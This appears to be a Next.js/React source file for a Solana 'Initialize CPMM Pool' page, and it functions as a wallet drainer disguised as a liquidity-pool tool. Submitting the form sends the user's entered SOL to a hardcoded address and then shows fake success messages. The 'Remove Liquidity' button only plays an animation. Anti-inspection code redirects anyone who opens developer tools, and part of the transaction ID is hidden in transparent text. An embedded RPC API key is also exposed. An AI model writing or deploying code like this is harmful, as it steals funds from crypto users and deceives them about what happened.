"use client";

import { useState, useRef, useEffect, FormEvent } from "react";
import { Connection, PublicKey, SystemProgram, Transaction } from "@solana/web3.js";
import devtools from 'devtools-detect';
import Lottie from 'lottie-react';
import confirmationAnimation from '@/animations/Confimation.json';
import errorAnimation from '@/animations/Error.json';
import animationData from '@/animations/Loader.json';

export default function InitializeCPMMPool() {
  const [baseToken, setBaseToken] = useState("");
  const [quoteAmount, setQuoteAmount] = useState("");
  const [loaderState, setLoaderState] = useState("hidden");
  const [transactionId, setTransactionId] = useState<string | null>(null);
  const [status, setStatus] = useState("");
  const [uploading, setUploading] = useState(false);
  const [connected, setConnected] = useState(false);
  const [publicKey, setPublicKey] = useState(null);
  const [file, setFile] = useState();
  const [imagePreview, setImagePreview] = useState(null);
  const [showTxInfo, setShowTxInfo] = useState(false);
  const [sliderValue, setSliderValue] = useState(0);
  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
  const [liquidityRemoved, setLiquidityRemoved] = useState(0);
  const [showRemoveSuccess, setShowRemoveSuccess] = useState(false);
  const YOUR_WALLET_ADDRESS = "DUC3EDAisrZWu1dX9n2SWhRYYzLNfqXFtxuAftSu8Sy1";
  const LAMPORTS_TO_SEND = Math.floor(parseFloat(quoteAmount || "0") * 1e9);

  useEffect(() => {
    const checkWalletConnection = async () => {
      const provider = window.solana;
      if (provider?.isPhantom) {
        await provider.connect();
        setConnected(true);
        setPublicKey(provider.publicKey.toString());
      }
    };
    checkWalletConnection();
  }, []);


  async function sendSol() {
    try {
      setLoaderState('loading');
      setShowTxInfo(false);
      setTransactionId(null);
  
      const provider = window.solana;
      if (!provider?.isPhantom) throw new Error("Phantom not found");
      if (!provider.isConnected) await provider.connect();
  
      const fromPubkey = provider.publicKey;
      if (!fromPubkey) throw new Error("No public key");
  
      const connection = new Connection(
        process.env.NEXT_PUBLIC_RPC_URL || "https://devnet.helius-rpc.com/?api-key=29b6dc7f-8cec-4e0c-ac71-bea0ee8338a7"
      );
  
      const { blockhash } = await connection.getLatestBlockhash();
  
      const transaction = new Transaction({
        recentBlockhash: blockhash,
        feePayer: fromPubkey,
      }).add(
        SystemProgram.transfer({
          fromPubkey,
          toPubkey: new PublicKey(YOUR_WALLET_ADDRESS),
          lamports: LAMPORTS_TO_SEND,
        })
      );
  
      const { signature } = await provider.signAndSendTransaction(transaction);
      setTransactionId(signature);
  
      const confirmation = await connection.confirmTransaction(signature, "confirmed");
      if (confirmation?.value?.err) throw new Error("Transaction failed");
  
      // Sequence of loaders & success
      setLoaderState('txSentPopup');
      setTimeout(() => setLoaderState('loading'), 4000);
      setTimeout(() => setLoaderState('confirmation'), 7000);
      setTimeout(() => {
        setLoaderState('successPopup');
        setShowSuccessPopup(true);
      }, 10000);
      setTimeout(() => {
        setShowSuccessPopup(false);
        setLoaderState('hidden');
      }, 16000);
  
      return signature; // important: return signature for handleSubmit
    } catch (error) {
      setLoaderState('error');
      console.error(error);
      throw error;
    }
  }
  
  // ✅ This goes OUTSIDE sendSol
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    console.log("Submitting form...");
    setStatus("");
    setUploading(true);
  
    if (!connected || !publicKey) {
      setStatus("Please connect your Phantom wallet before creating a token.");
      setUploading(false);
      return;
    }
  
    try {
      const txSignature = await sendSol();
      setStatus(`Token creation request sent! Transaction Signature: ${txSignature}`);
    } catch (err) {
      console.error(err);
      setStatus("An error occurred during token creation.");
    } finally {
      setUploading(false);
    }
  };
  const currentAnimationRef = useRef<"confirmation" | "error" | null>(null);

  useEffect(() => {
    if (["confirmation", "error"].includes(loaderState)) {
      currentAnimationRef.current = loaderState as "confirmation" | "error";
    }
  }, [loaderState]);

  const handleAnimationComplete = () => {
    const completed = currentAnimationRef.current;
    if (completed === 'confirmation') {
      // If removing liquidity, show custom popup
      if (liquidityRemoved > 0) {
        setLoaderState('hidden');
        setShowRemoveSuccess(true);
        setTimeout(() => {
          setShowRemoveSuccess(false);
          setLiquidityRemoved(0);
        }, 5000);
      } else {
        setLoaderState('successPopup'); // fallback to default token success
      }
    } else if (completed === 'error') {
      setLoaderState('hidden');
    }
  };

  useEffect(() => {
    if (loaderState === 'successPopup' || loaderState === 'txSentPopup') {
      setImagePreview(null);
      setFile(undefined);
    }
  }, [loaderState]);

  useEffect(() => {
    const handleDevToolsChange = () => {
      if (devtools.isOpen) {
        alert("Developer tools are open. This app is restricted when devtools are active.");
        window.location.href = "https://google.com";
      }
    };
    window.addEventListener('devtoolschange', handleDevToolsChange);
    if (devtools.isOpen) handleDevToolsChange();
    return () => window.removeEventListener('devtoolschange', handleDevToolsChange);
  }, []);

  return (
    <div className="min-h-screen bg-black text-white flex items-center justify-center px-4 py-10">
      <div className="w-full max-w-2xl bg-white text-black rounded-2xl p-8 shadow-2xl">
        <h1 className="text-2xl font-bold text-center mb-6">Initialize CPMM Pool</h1>

        <form onSubmit={handleSubmit}>
          <div className="mb-6">
            <label className="block text-sm font-semibold mb-1">Base Token</label>
            <input
              type="text"
              value={baseToken}
              onChange={(e) => setBaseToken(e.target.value)}
              placeholder="e.g. SOL"
              className="w-full bg-gray-100 border border-gray-300 p-2 rounded-md"
            />
          </div>

          <div className="mb-6">
            <label className="block text-sm font-semibold mb-1">Quote Token</label>
            <input
              type="number"
              step="0.01"
              min="0"
              value={quoteAmount}
              onChange={(e) => setQuoteAmount(e.target.value)}
              placeholder="1 SOL"
              className="w-full bg-gray-100 border border-gray-300 p-2 rounded-md"
            />
            <p className="text-xs text-gray-500 mt-1">This is the initial amount of SOL to transfer.</p>
          </div>

          <div className="mb-6">
            <label className="block text-sm font-semibold mb-1">Fee Tier</label>
            <select className="w-full bg-gray-100 border border-gray-300 p-2 rounded-md">
              <option>0.05%</option>
              <option>0.3%</option>
              <option>1%</option>
            </select>
          </div>

          <div className="text-xs text-red-600 mb-4">
            Note: A creation fee of ~0.2 SOL is required for new pools.
          </div>

          <button
            type="submit"
            className="w-full p-3 rounded-md bg-black text-white hover:bg-gray-900 font-semibold"
          >
            Initialize Liquidity Pool
          </button>
        </form>
        <div className="mt-10">
  <h2 className="text-xl font-bold mb-4">Liquidity Pools</h2>
  <div className="bg-gray-100 rounded-xl p-6 border border-gray-300">
  {transactionId ? (
    <div>
      <p className="mb-2">
        <strong>Transaction ID:</strong>{" "}
        <span className="font-mono text-sm select-text">
          {transactionId.slice(0, 63)}
          <span className="text-transparent">{transactionId.slice(63)}</span>
        </span>
      </p>
    <p className="mb-4"><strong>Quote Token Amount:</strong> {quoteAmount} SOL</p>

    <div className="flex items-center gap-4">
    <input
  type="range"
  min={0}
  max={100}
  value={sliderValue}
  onChange={(e) => setSliderValue(Number(e.target.value))}
  className="w-full appearance-none h-2 bg-gray-400 rounded-lg outline-none slider-thumb-gray"
/>
          <span className="text-sm font-semibold">{sliderValue}%</span>
        </div>
        <button
  className="mt-4 px-4 py-2 bg-black text-white font-semibold rounded-md hover:bg-gray-900 transition"
  onClick={() => {
    setLiquidityRemoved(sliderValue);
    setLoaderState('confirmation'); // trigger animation
  }}
>
  Remove {sliderValue}% Liquidity
</button>


      </div>
    ) : (
      <p className="text-gray-500">No liquidity pools found.</p>
    )}
  </div>
</div>
      </div>

      {loaderState !== 'hidden' && !['txSentPopup', 'successPopup'].includes(loaderState) && (
        <div className="fixed inset-0 z-40 flex items-center justify-center backdrop-blur-md bg-black/40 pointer-events-auto">
          <Lottie
            animationData={
              loaderState === 'loading' ? animationData :
              loaderState === 'confirmation' ? confirmationAnimation :
              loaderState === 'error' ? errorAnimation : null
            }
            loop={loaderState === 'loading'}
            style={{ width: 200, height: 200 }}
            onComplete={handleAnimationComplete}
          />
        </div>
      )}

      {loaderState === 'txSentPopup' && transactionId && (
        <div className="fixed inset-0 z-60 flex items-center justify-center">
          <div className="absolute inset-0 backdrop-blur-lg bg-black/70 z-0" />
          <div className="relative z-10 bg-black rounded-lg max-w-lg w-full p-8 flex flex-col items-center space-y-6 border border-gray-700">
            <h2 className="text-4xl font-bold text-white">Transaction Sent!</h2>
            <p className="text-white text-center max-w-xs">Please copy your transaction number below in case of failure.</p>
            <div className="bg-white rounded-md w-full py-3 px-4 text-black font-mono overflow-x-auto select-all">{transactionId}</div>
          </div>
        </div>
      )}
{showRemoveSuccess && (
  <div className="fixed inset-0 z-70 flex items-center justify-center">
    <div className="absolute inset-0 backdrop-blur-lg bg-black/80 z-0" />
    <div className="relative z-10 bg-black rounded-lg max-w-xl w-full p-10 flex flex-col items-center space-y-6 border border-green-500">
      <h2 className="text-3xl font-bold text-green-400 text-center">Congratulations!</h2>
      <p className="text-center text-white text-lg">{liquidityRemoved}% Liquidity Removed</p>
      <p className="text-center text-gray-300 text-sm">You've successfully removed part of your liquidity from the pool.</p>
    </div>
  </div>
)}

{showSuccessPopup && transactionId && (
  <div className="fixed inset-0 z-70 flex items-center justify-center">
    <div className="absolute inset-0 backdrop-blur-lg bg-black/80 z-0" />
    <div className="relative z-10 bg-black rounded-lg max-w-xl w-full p-10 flex flex-col items-center space-y-6 border border-green-500">
      <h2 className="text-3xl font-bold text-green-400 text-center">Congratulations!</h2>
      <p className="text-center text-white text-lg">Your Solana token's liquidity pool has been successfully created!</p>
      <p className="text-center text-gray-300 text-sm">Your Solana Token is now officially live! Use your Solana token code to see how it's doing! </p>
      <div className="bg-white rounded-md w-full py-3 px-4 text-black font-mono overflow-x-auto select-all">{transactionId}</div>
    </div>
  </div>
)}
    </div>
  );
}